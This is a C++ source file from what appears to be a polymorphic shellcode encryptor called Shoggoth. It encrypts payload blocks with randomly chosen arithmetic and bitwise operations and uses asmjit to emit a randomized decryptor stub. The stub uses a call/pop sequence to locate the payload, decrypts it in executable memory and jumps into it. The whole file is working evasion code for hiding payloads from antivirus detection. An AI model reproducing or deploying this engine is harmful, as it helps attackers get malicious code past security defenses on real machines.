#include "SecondEncryption.h"


PBYTE ShoggothPolyEngine::SecondEncryption(PBYTE plainPayload, int payloadSize, int& newPayloadSize) {
    uint64_t* blockCursor = NULL;
    this->numberOfBlocks = (payloadSize / BLOCK_SIZE);
    PBYTE encryptedArea = NULL;
    if (payloadSize % BLOCK_SIZE) {
        this->numberOfBlocks++;
    }
    newPayloadSize = this->numberOfBlocks * BLOCK_SIZE;
    //encryptedArea = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newPayloadSize);
    encryptedArea = (PBYTE)VirtualAlloc(NULL, newPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(encryptedArea, plainPayload, payloadSize);
    memset(encryptedArea + payloadSize, 0x90, (payloadSize % BLOCK_SIZE ? BLOCK_SIZE - payloadSize % BLOCK_SIZE : 0));
    blockCursor = (uint64_t*)encryptedArea;
    this->addressHolderForSecondEncryption = this->GetRandomGeneralPurposeRegister();
    this->encryptListForBlocks = (ENCRYPT_TYPE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(ENCRYPT_TYPE) * this->numberOfBlocks);
    for (int i = 0; i < this->numberOfBlocks; i++) {
        this->GetRandomSecondEncryption(&(this->encryptListForBlocks[i]));
        this->ApplyRandomSecondEncryption(blockCursor, &(this->encryptListForBlocks[i]));
        blockCursor++;
    }
    VirtualFree(plainPayload, 0, MEM_RELEASE);
    return encryptedArea;
}

PBYTE ShoggothPolyEngine::SecondDecryptor(PBYTE encryptedPayload, int payloadSize, int& secondDecryptorBlockSize) {
    // Garbage + callto pop + garbage + payload + pop + garbage + decipherstep
    // Ya constantla olsun ya da registera atanan bir deger ile
    // Ayrica pop her ne kadar garbage'i gosterse bile, payload offsetini ayri degiskende tutuyor
    int callStubSize = 0;
    int firstGarbageSize = 0;
    int popStubSize = 0;
    int secondGarbageSize = 0;
    int decryptorStubSize = 0;
    PBYTE returnPtr = NULL;
    PBYTE callStub = this->GetCallInstructionOverPayload(payloadSize, callStubSize);
    //PBYTE firstGarbage = this->GenerateRandomGarbage(firstGarbageSize);
    // Mov + rsp stub da eklenecek
    PBYTE popStub = this->GetPopInstructionAfterPayload(popStubSize);
    //PBYTE secondGarbage = this->GenerateRandomGarbage(secondGarbageSize);
    PBYTE decryptorStub = this->GenerateSecondDecryptorStub(decryptorStubSize, secondGarbageSize);

    returnPtr = (PBYTE)VirtualAlloc(NULL, callStubSize + payloadSize + popStubSize + decryptorStubSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(returnPtr + secondDecryptorBlockSize, callStub, callStubSize);
    secondDecryptorBlockSize += callStubSize;
    memcpy(returnPtr + secondDecryptorBlockSize, encryptedPayload, payloadSize);
    secondDecryptorBlockSize += payloadSize;
    memcpy(returnPtr + secondDecryptorBlockSize, popStub, popStubSize);
    secondDecryptorBlockSize += popStubSize;
    memcpy(returnPtr + secondDecryptorBlockSize, decryptorStub, decryptorStubSize);
    secondDecryptorBlockSize += decryptorStubSize;
    this->asmjitRuntime.release(callStub);
    this->asmjitRuntime.release(popStub);
    this->asmjitRuntime.release(decryptorStub);
    // VirtualFree(callStub, 0, MEM_RELEASE);
    // VirtualFree(popStub, 0, MEM_RELEASE);
    // VirtualFree(decryptorStub, 0, MEM_RELEASE);
    return returnPtr;
}


PBYTE ShoggothPolyEngine::GenerateSecondDecryptorStub(int& decryptorStubSize, int offsetToEncryptedPayload) {
    for (int i = 0; i < this->numberOfBlocks; i++) {
        // QWORDUN yanina offset konulabiliyomus
        // Aaaa schemanin arasina da garbage koyabiliyoz
        // Bu decoder stubi popdan sonraya gelecek
        // ptr olanlari add olanlarla da degistir
        switch (this->encryptListForBlocks[i].operation) {
        case ADD_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
                asmjitAssembler->sub(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->sub(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
            }
            break;
        case SUB_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
                asmjitAssembler->add(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->add(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
            }
            break;
        case XOR_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
                asmjitAssembler->xor_(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->xor_(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
            }
            break;
        case NOT_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                asmjitAssembler->not_(this->encryptListForBlocks[i].operandRegister);
                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->not_(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
            }
            break;
        case NEG_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                asmjitAssembler->neg(this->encryptListForBlocks[i].operandRegister);
                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->neg(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
            }
            break;
        case INC_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                asmjitAssembler->dec(this->encryptListForBlocks[i].operandRegister);
                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->dec(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
            }
            break;
        case DEC_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                asmjitAssembler->inc(this->encryptListForBlocks[i].operandRegister);
                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->inc(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
            }
            break;
        case ROL_OPERATION_FOR_CRYPT: // TODO: Register case
            asmjitAssembler->ror(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
            break;
        case ROR_OPERATION_FOR_CRYPT:
            asmjitAssembler->rol(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
            break;
        }
    }
    if (RandomizeBool()) {
        asmjitAssembler->jmp(this->addressHolderForSecondEncryption);
    }
    else {
        asmjitAssembler->push(this->addressHolderForSecondEncryption);
        asmjitAssembler->ret();
    }
    HeapFree(GetProcessHeap(), NULL, this->encryptListForBlocks);
    return this->AssembleCodeHolder(decryptorStubSize);
}


void ShoggothPolyEngine::GetRandomSecondEncryption(ENCRYPT_TYPE* encryptTypeHolder) {
    encryptTypeHolder->operation = (OPERATIONS)RandomizeInRange(0, 8);
    x86::Gp tempRegister = GetRandomGeneralPurposeRegister();
    while (addressHolderForSecondEncryption.id() == tempRegister.id()) {
        tempRegister = this->GetRandomGeneralPurposeRegister();
    }
    switch (encryptTypeHolder->operation) {
    case ADD_OPERATION_FOR_CRYPT:
    case SUB_OPERATION_FOR_CRYPT:
    case XOR_OPERATION_FOR_CRYPT:
        if ((encryptTypeHolder->isRegister = RandomizeBool())) {
            encryptTypeHolder->operandRegister = tempRegister;
            encryptTypeHolder->operandValue = RandomizeQWORD();
        }
        else {
            encryptTypeHolder->operandValue = RandomizeDWORD();
        }
        break;
    case NOT_OPERATION_FOR_CRYPT:
    case NEG_OPERATION_FOR_CRYPT:
    case INC_OPERATION_FOR_CRYPT:
    case DEC_OPERATION_FOR_CRYPT:
        if ((encryptTypeHolder->isRegister = RandomizeBool())) {
            encryptTypeHolder->operandRegister = tempRegister;
        }
        break;
    case ROL_OPERATION_FOR_CRYPT:
    case ROR_OPERATION_FOR_CRYPT:
        encryptTypeHolder->isRegister = false;
        encryptTypeHolder->operandValue = RandomizeInRange(1, 63);
        break;
    }
}

void ShoggothPolyEngine::ApplyRandomSecondEncryption(uint64_t* blockCursor, ENCRYPT_TYPE* encryptTypeHolder) {
    uint32_t temp1 = 0;
    uint32_t temp2 = 0;
    uint32_t temp3 = 0;
    uint64_t temp4 = 0;
    uint64_t temp5 = 0;
    switch (encryptTypeHolder->operation) {
    case ADD_OPERATION_FOR_CRYPT:
        if (encryptTypeHolder->isRegister) {
            *blockCursor = (*blockCursor + encryptTypeHolder->operandValue);
        }
        else {
            // Endiannes magic
            temp4 = *blockCursor;
            temp1 = *blockCursor;
            temp2 = encryptTypeHolder->operandValue;
            temp3 = ((temp1 + temp2));
            *blockCursor = temp3;
            temp5 = temp4 & 0xFFFFFFFF00000000;
            *blockCursor |= temp5;
        }
        break;
    case SUB_OPERATION_FOR_CRYPT:
        if (encryptTypeHolder->isRegister) {
            *blockCursor = (*blockCursor - encryptTypeHolder->operandValue);
        }
        else {
            // Endiannes magic
            temp4 = *blockCursor;
            temp1 = *blockCursor;
            temp2 = encryptTypeHolder->operandValue;
            temp3 = ((temp1 - temp2));
            *blockCursor = temp3;
            temp5 = temp4 & 0xFFFFFFFF00000000;
            *blockCursor |= temp5;
        }
        break;
    case XOR_OPERATION_FOR_CRYPT:
        *blockCursor = *blockCursor ^ encryptTypeHolder->operandValue;
        break;
    case NOT_OPERATION_FOR_CRYPT:
        *blockCursor = ~(*blockCursor);
        break;
    case NEG_OPERATION_FOR_CRYPT:
        *blockCursor = (uint64_t)(-(int64_t(*blockCursor)));
        break;
    case INC_OPERATION_FOR_CRYPT:
        *blockCursor = *blockCursor + 1;
        break;
    case DEC_OPERATION_FOR_CRYPT:
        *blockCursor = *blockCursor - 1;
        break;
    case ROL_OPERATION_FOR_CRYPT:
        *blockCursor = _rotl64(*blockCursor, encryptTypeHolder->operandValue);
        break;
    case ROR_OPERATION_FOR_CRYPT:
        *blockCursor = _rotr64(*blockCursor, encryptTypeHolder->operandValue);
        break;
    }
}